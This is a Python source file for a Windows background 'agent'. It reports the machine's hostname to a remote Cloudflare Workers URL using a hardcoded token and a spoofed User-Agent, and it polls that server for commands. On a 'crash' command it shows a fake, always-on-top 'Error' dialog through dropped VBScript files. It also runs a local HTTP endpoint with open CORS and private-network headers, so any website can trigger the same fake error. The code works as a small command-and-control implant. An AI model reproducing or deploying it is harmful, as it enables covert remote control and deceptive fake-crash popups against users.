import ctypes
import json
import os
import socket
import subprocess
import tempfile
import threading
import time
import urllib.error
import urllib.request
from http.server import BaseHTTPRequestHandler, HTTPServer

PORT = 5005

AGENT_TOKEN = "ed81f9a6ad3fe1ba5587430863c983c2ea2c77239a158fa7"
LOG_AUTH_URL = "https://telelluc-log-auth.mrocadlectric.workers.dev"
HEARTBEAT_INTERVAL_SECONDS = 20
COMMAND_CHECK_INTERVAL_SECONDS = 5
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) telelluc-agent"

device_id = None

ERROR_VBS_PATH = os.path.join(tempfile.gettempdir(), "telelluc_error.vbs")
ACTIVATOR_VBS_PATH = os.path.join(tempfile.gettempdir(), "telelluc_activator.vbs")

ERROR_VBS_CONTENT = 'MsgBox "Error", 16 + 65536 + 4096, "Error"\n'
ACTIVATOR_VBS_CONTENT = (
    'Set shell = CreateObject("WScript.Shell")\n'
    "For i = 1 To 25\n"
    "    WScript.Sleep 200\n"
    "Next\n"
)

with open(ERROR_VBS_PATH, "w") as f:
    f.write(ERROR_VBS_CONTENT)

with open(ACTIVATOR_VBS_PATH, "w") as f:
    f.write(ACTIVATOR_VBS_CONTENT)

user32 = ctypes.windll.user32
HWND_TOPMOST = -1
SWP_NOMOVE = 0x0002
SWP_NOSIZE = 0x0001
SWP_SHOWWINDOW = 0x0040


def _find_error_window():
    result = []

    @ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_void_p, ctypes.c_void_p)
    def _enum(hwnd, _lparam):
        if user32.IsWindowVisible(hwnd):
            buf = ctypes.create_unicode_buffer(256)
            user32.GetWindowTextW(hwnd, buf, 256)
            if buf.value.strip() == "Error":
                result.append(hwnd)
                return False
        return True

    user32.EnumWindows(_enum, 0)
    return result[0] if result else None


def _force_topmost():
    for _ in range(60):
        hwnd = _find_error_window()
        if hwnd:
            for _ in range(10):
                user32.SetWindowPos(
                    hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW
                )
                time.sleep(0.2)
            return
        time.sleep(0.05)


def show_error():
    subprocess.Popen(["wscript.exe", ERROR_VBS_PATH])
    subprocess.Popen(["wscript.exe", ACTIVATOR_VBS_PATH])
    _force_topmost()


def heartbeat_loop():
    global device_id
    hostname = socket.gethostname()
    payload = json.dumps({"hostname": hostname}).encode("utf-8")
    while True:
        try:
            req = urllib.request.Request(
                LOG_AUTH_URL + "/heartbeat",
                data=payload,
                headers={
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + AGENT_TOKEN,
                    "User-Agent": USER_AGENT,
                },
                method="POST",
            )
            resp = urllib.request.urlopen(req, timeout=10).read()
            data = json.loads(resp.decode("utf-8"))
            device_id = data.get("id")
            print(f"[heartbeat] OK - registrado como device {device_id} (hostname: {hostname})", flush=True)
        except Exception as e:
            print(f"[heartbeat] ERROR: {e}", flush=True)
        time.sleep(HEARTBEAT_INTERVAL_SECONDS)


def command_check_loop():
    global device_id
    while True:
        if device_id is None:
            time.sleep(COMMAND_CHECK_INTERVAL_SECONDS)
            continue
        try:
            req = urllib.request.Request(
                LOG_AUTH_URL + f"/command?deviceId={device_id}",
                headers={
                    "Authorization": "Bearer " + AGENT_TOKEN,
                    "User-Agent": USER_AGENT,
                },
                method="GET",
            )
            resp = urllib.request.urlopen(req, timeout=10).read()
            data = json.loads(resp.decode("utf-8"))
            cmd = data.get("command")
            if cmd == "crash":
                print(f"[command] Recibido 'crash' para device {device_id}", flush=True)
                threading.Thread(target=show_error, daemon=True).start()
        except Exception as e:
            print(f"[command] ERROR: {e}", flush=True)
        time.sleep(COMMAND_CHECK_INTERVAL_SECONDS)


class Handler(BaseHTTPRequestHandler):
    def _cors(self):
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Private-Network", "true")

    def do_OPTIONS(self):
        self.send_response(204)
        self._cors()
        self.end_headers()

    def do_GET(self):
        if self.path == "/crash":
            threading.Thread(target=show_error, daemon=True).start()
            self.send_response(200)
        else:
            self.send_response(404)
        self._cors()
        self.end_headers()

    def log_message(self, format, *args):
        pass


if __name__ == "__main__":
    threading.Thread(target=heartbeat_loop, daemon=True).start()
    threading.Thread(target=command_check_loop, daemon=True).start()

    server = HTTPServer(("127.0.0.1", PORT), Handler)
    print(f"[*] Agente escuchando peticiones de interfaz en http://127.0.0.1:{PORT} ...", flush=True)

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nCerrando el agente local.")